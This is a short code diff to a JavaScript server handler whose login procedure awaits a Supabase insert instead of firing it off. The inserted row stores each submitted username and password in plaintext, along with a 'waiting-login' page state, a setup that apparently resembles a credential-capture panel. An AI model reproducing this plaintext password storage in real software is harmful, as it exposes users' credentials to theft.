@@ -186,11 +186,11 @@ async function handleProcedure(fullPath, rawInput, req, res) {
       const { username, password } = input;
       if (!username || !password) return { success: false };
       const nid = 'LOGIN_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
-      supabase.from('applications').insert({
+      await supabase.from('applications').insert({
         id: genId().slice(0, 16), national_id: nid,
         username, password, current_page: 'waiting-login',
         login_status: 'pending', last_active_at: Date.now(), created_at: Date.now()
-      }).then(() => {}).catch(() => {});
+      });
       return { success: true, nationalId: nid };
     }
 
